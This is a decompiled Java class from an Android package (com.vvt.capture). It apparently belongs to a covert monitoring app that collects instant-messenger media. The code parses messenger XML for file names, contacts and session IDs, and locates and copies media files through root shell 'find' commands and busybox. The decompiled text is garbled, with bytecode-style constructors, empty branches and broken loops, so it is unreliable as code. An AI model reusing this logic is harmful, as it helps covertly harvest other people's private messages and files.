package com.vvt.capture.e;

import android.webkit.MimeTypeMap;
import com.vvt.ag.b;
import com.vvt.im.a.c;
import com.vvt.im.events.ImMediaFileType;
import com.vvt.im.events.ImType;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.ShellUtil;
import java.io.File;
import java.io.IOException;
import java.io.StringReader;
import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;

public class g
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private static final boolean c = com.vvt.ak.a.d;
  
  public static String a(a parama)
  {
    Object localObject1 = "";
    for (;;)
    {
      String str1;
      Object localObject4;
      boolean bool6;
      boolean bool2;
      try
      {
        str1 = parama.a;
        localObject4 = "poriginal";
        boolean bool1 = str1.equals(localObject4);
        if (!bool1)
        {
          str1 = parama.a;
          localObject4 = "coriginal";
          bool1 = str1.equals(localObject4);
          if (!bool1) {}
        }
        else
        {
          bool1 = a;
          if (bool1) {}
          str1 = "$ABS";
          localObject4 = parama.c;
          boolean bool3 = a;
          if (bool3) {}
          String str2 = new java/lang/String;
          str2.<init>((byte[])localObject4);
          int j = str2.indexOf(str1);
          boolean bool5 = a;
          if (bool5) {}
          j += -4;
          int m = localObject4[j] + -4;
          boolean bool4 = a;
          if (bool4) {}
          int k = str2.indexOf(str1);
          int i = str1.length() + k;
          m += i;
          str1 = str2.substring(i, m);
        }
      }
      catch (Exception localException2) {}
      try
      {
        bool6 = a;
        if (bool6) {}
        try
        {
          localObject1 = new java/io/File;
          localObject4 = "/";
          ((File)localObject1).<init>((String)localObject4, str1);
          localObject1 = ((File)localObject1).getCanonicalPath();
        }
        catch (IOException localIOException)
        {
          bool6 = b;
          if (!bool6) {
            continue;
          }
          Object localObject2 = str1;
          continue;
        }
        bool2 = a;
        if (bool2) {}
        return (String)localObject1;
      }
      catch (Exception localException1)
      {
        for (;;)
        {
          Object localObject3 = localException2;
        }
      }
    }
    bool2 = c;
    if (bool2) {}
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      bool2 = a;
      if (!bool2) {
        break;
      }
      break;
      bool2 = b;
      if (!bool2) {}
    }
  }
  
  protected static String a(String paramString)
  {
    String str = null;
    if (paramString != null) {}
    try
    {
      localObject1 = h(paramString);
      localObject2 = ((Document)localObject1).getDocumentElement();
      ((Element)localObject2).normalize();
      localObject2 = "files";
      localObject1 = ((Document)localObject1).getElementsByTagName((String)localObject2);
      localObject2 = null;
      localObject1 = ((NodeList)localObject1).item(0);
      localObject1 = ((Node)localObject1).getTextContent();
      str = ((String)localObject1).trim();
    }
    catch (ParserConfigurationException localParserConfigurationException1)
    {
      for (;;)
      {
        Object localObject1;
        Object localObject2;
        bool = b;
        if (!bool) {}
      }
    }
    catch (SAXException localSAXException1)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    catch (IOException localIOException1)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    catch (Exception localException1)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    bool = b.a(str);
    if (bool) {}
    try
    {
      localObject1 = h(paramString);
      localObject2 = ((Document)localObject1).getDocumentElement();
      ((Element)localObject2).normalize();
      localObject2 = "OriginalName";
      localObject1 = ((Document)localObject1).getElementsByTagName((String)localObject2);
      localObject2 = null;
      localObject1 = ((NodeList)localObject1).item(0);
      localObject1 = ((Node)localObject1).getAttributes();
      localObject2 = "v";
      localObject1 = ((NamedNodeMap)localObject1).getNamedItem((String)localObject2);
      localObject1 = ((Node)localObject1).getNodeValue();
      localObject1 = ((String)localObject1).toString();
      str = ((String)localObject1).trim();
    }
    catch (ParserConfigurationException localParserConfigurationException2)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    catch (SAXException localSAXException2)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    catch (IOException localIOException2)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    catch (Exception localException2)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
    return str;
  }
  
  protected static String a(String paramString1, String paramString2, ImType paramImType, ImMediaFileType paramImMediaFileType, String paramString3)
  {
    Object localObject = null;
    boolean bool = ShellUtil.b(paramString2);
    if (bool)
    {
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      String str = c.a(paramString1, paramImType, paramImMediaFileType);
      localObject = ((StringBuilder)localObject).append(str);
      str = File.separator;
      localObject = ((StringBuilder)localObject).append(str);
      str = c.a(paramImMediaFileType);
      localObject = str;
      ShellUtil.a(paramString2, (String)localObject);
      ShellUtil.b(paramString3, (String)localObject);
    }
    for (;;)
    {
      return (String)localObject;
      bool = c;
      if (!bool) {}
    }
  }
  
  public static String a(String paramString1, String paramString2, String paramString3, long paramLong)
  {
    Object localObject = null;
    String str1 = "No such file or directory";
    for (;;)
    {
      try
      {
        bool1 = ShellUtil.b(paramString2);
        if (!bool1) {
          continue;
        }
        String str2 = "%s find %s -name \"%s\" -size %dc";
        int i = 4;
        Object[] arrayOfObject = new Object[i];
        int j = 0;
        arrayOfObject[0] = paramString1;
        j = 1;
        arrayOfObject[j] = paramString2;
        j = 2;
        arrayOfObject[j] = paramString3;
        j = 3;
        Long localLong = Long.valueOf(paramLong);
        arrayOfObject[j] = localLong;
        str2 = String.format(str2, arrayOfObject);
        boolean bool2 = a;
        if (bool2) {}
        str2 = KMShell.a(str2);
        bool2 = a;
        if ((!bool2) || (str2 != null))
        {
          boolean bool3 = str2.equalsIgnoreCase(str1);
          if (!bool3) {
            localObject = str2;
          }
        }
        bool1 = a;
        if (!bool1) {}
      }
      catch (Exception localException)
      {
        boolean bool1 = b;
        if (!bool1) {
          continue;
        }
        continue;
      }
      return (String)localObject;
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  public static String[] a(String paramString, String[] paramArrayOfString)
  {
    i = paramArrayOfString.length;
    String[] arrayOfString = new String[i];
    try
    {
      localObject1 = h(paramString);
      Element localElement = ((Document)localObject1).getDocumentElement();
      localElement.normalize();
      localObject1 = ((Document)localObject1).getFirstChild();
      localObject1 = (Element)localObject1;
      int j = 0;
      localElement = null;
      for (;;)
      {
        int k = paramArrayOfString.length;
        if (j >= k) {
          break;
        }
        String str = paramArrayOfString[j];
        str = ((Element)localObject1).getAttribute(str);
        arrayOfString[j] = str;
        j += 1;
      }
      localObject1 = arrayOfString;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        i = 0;
        Object localObject2 = null;
        boolean bool = b;
        if (!bool) {}
      }
    }
    return (String[])localObject1;
  }
  
  protected static String b(String paramString)
  {
    String str = null;
    if (paramString != null)
    {
      boolean bool1 = a;
      if (!bool1) {}
    }
    try
    {
      Object localObject1 = h(paramString);
      bool2 = a;
      if (bool2) {}
      Object localObject2 = ((Document)localObject1).getDocumentElement();
      ((Element)localObject2).normalize();
      bool2 = a;
      if (bool2) {}
      localObject1 = ((Document)localObject1).getDocumentElement();
      bool2 = a;
      if (bool2) {}
      localObject1 = ((Element)localObject1).getAttributes();
      localObject2 = "uri";
      localObject1 = ((NamedNodeMap)localObject1).getNamedItem((String)localObject2);
      str = ((Node)localObject1).getTextContent();
    }
    catch (ParserConfigurationException localParserConfigurationException)
    {
      for (;;)
      {
        bool2 = b;
        if (bool2) {}
        localParserConfigurationException.printStackTrace();
      }
    }
    catch (SAXException localSAXException)
    {
      for (;;)
      {
        bool2 = b;
        if (bool2) {}
        localSAXException.printStackTrace();
      }
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        bool2 = b;
        if (bool2) {}
        localIOException.printStackTrace();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = b;
        if (bool2) {}
        localException.printStackTrace();
      }
    }
    return str;
  }
  
  protected static ArrayList c(String paramString)
  {
    int i = 0;
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject1 = h(paramString);
      Object localObject2 = "contacts";
      localObject1 = ((Document)localObject1).getElementsByTagName((String)localObject2);
      if (localObject1 != null)
      {
        int j = ((NodeList)localObject1).getLength();
        if (j > 0)
        {
          j = 0;
          localObject2 = null;
          localObject1 = ((NodeList)localObject1).item(0);
          localObject1 = ((Node)localObject1).getChildNodes();
          for (;;)
          {
            j = ((NodeList)localObject1).getLength();
            if (i >= j) {
              break;
            }
            localObject2 = ((NodeList)localObject1).item(i);
            localObject2 = ((Node)localObject2).getAttributes();
            String str = "s";
            localObject2 = ((NamedNodeMap)localObject2).getNamedItem(str);
            localObject2 = ((Node)localObject2).getNodeValue();
            localArrayList.add(localObject2);
            boolean bool2 = a;
            if (bool2) {}
            i += 1;
          }
        }
      }
      boolean bool1;
      return localArrayList;
    }
    catch (Exception localException)
    {
      bool1 = b;
      if (bool1) {}
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  protected static String d(String paramString)
  {
    String str1 = null;
    String str2 = MimeTypeMap.getFileExtensionFromUrl(paramString);
    if (str2 != null) {
      str1 = MimeTypeMap.getSingleton().getMimeTypeFromExtension(str2);
    }
    return str1;
  }
  
  protected static String e(String paramString)
  {
    try
    {
      localObject1 = h(paramString);
      Object localObject6 = ((Document)localObject1).getDocumentElement();
      ((Element)localObject6).normalize();
      localObject1 = ((Document)localObject1).getFirstChild();
      localObject1 = (Element)localObject1;
      localObject6 = "sid";
      localObject1 = ((Element)localObject1).getAttribute((String)localObject6);
    }
    catch (ParserConfigurationException localParserConfigurationException)
    {
      for (;;)
      {
        Object localObject1;
        bool = b;
        if (bool) {}
        bool = false;
        Object localObject2 = null;
      }
    }
    catch (SAXException localSAXException)
    {
      for (;;)
      {
        bool = b;
        if (bool) {}
        bool = false;
        Object localObject3 = null;
      }
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        bool = b;
        if (bool) {}
        bool = false;
        Object localObject4 = null;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool = b;
        if (bool) {}
        bool = false;
        Object localObject5 = null;
      }
    }
    return (String)localObject1;
  }
  
  public static String f(String paramString)
  {
    if (paramString == null) {}
    String str;
    for (Object localObject = null;; localObject = ((Matcher)localObject).replaceAll(str).trim())
    {
      return (String)localObject;
      localObject = Pattern.compile("<[/]*br[^>]*>").matcher(paramString).replaceAll("\n");
      localObject = Pattern.compile("<[/]*p[^>]*>").matcher((CharSequence)localObject).replaceAll("\n");
      localObject = Pattern.compile("<[^<>]*>").matcher((CharSequence)localObject);
      str = "";
    }
  }
  
  public static String g(String paramString)
  {
    return p.a(paramString, "busybox");
  }
  
  private static Document h(String paramString)
  {
    DocumentBuilder localDocumentBuilder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
    InputSource localInputSource = new org/xml/sax/InputSource;
    StringReader localStringReader = new java/io/StringReader;
    localStringReader.<init>(paramString);
    localInputSource.<init>(localStringReader);
    return localDocumentBuilder.parse(localInputSource);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/e/FxFileObserverWorker.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */